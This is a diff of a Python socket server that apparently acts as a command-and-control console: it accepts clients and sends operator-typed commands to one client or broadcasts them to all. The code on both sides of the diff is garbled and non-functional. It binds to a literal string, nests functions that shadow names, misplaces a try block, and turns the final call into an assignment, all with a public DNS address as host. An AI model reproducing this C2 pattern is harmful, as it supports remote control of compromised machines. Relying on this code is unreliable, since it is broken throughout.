@@ -38,7 +38,7 @@ def accept_clients(server):
 
 def start_server(host="8.8.8.8", port=5555):
 	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	server.bind("host, port")
+	server.bind(("host, port"))
 	server.listen(5)
 	print(f"[*] Listening on {host}:{port}")
 
@@ -51,28 +51,34 @@ def logo():
 	while True:
 		def clients():
 			if not clients:
-				continue
-			def Idx(addr):
-				print(f"{Idx}, {addr[0]}:{addr[1]}")
 
-			try:
-				choice = int(input("Select client number (or 0 to broadcast): )"))
-			except ValueError:
-				continue
+				def Idx(addr):
+					print(f"{Idx}, {addr[0]}:{addr[1]}")
 
+try:
+				choice = int(input("Select client number (or 0 to broadcast): "))
+except ValueError:
+
+				def servers():
+					if not servers:
+						
+						def servers(addr):
+							choice = int(input("Select server number (or 0 to broadcast): "))
+							print(f"{servers}, {addr[0]}:{addr[1]}")
 			
-			if choice == "1":
-				command = input("Enter Command to send (broadcast): ")
-				for client in clients.values():
-					client.send(command.encode())
-			elif 0 <= choice < len(clients):
-				target_addr = list(clients.keys())
-				command = input(f"Enter command to send to {target_addr[0]: }")
-				clients[target_addr].send(command.encode())
-			else:
-				print("[!] Invalid selection.")
+						if choice == "1":
+							command = input("Enter Command to send (broadcast): ")
+							for client in clients.values():
+								client.send(command.encode())
+						elif 0 <= choice < len(clients):
+							target_addr = list(clients.keys())
+							command = input(f"Enter command to send to {target_addr[0]: }")
+							def clients():
+								clients[target_addr].send(command.encode())
+						else:
+							print("[!] Invalid selection.")
 
 
 
 if __name__ == "__main__":
-	start_server("8.8.8.8")
+   start_server = ("8.8.8.8")
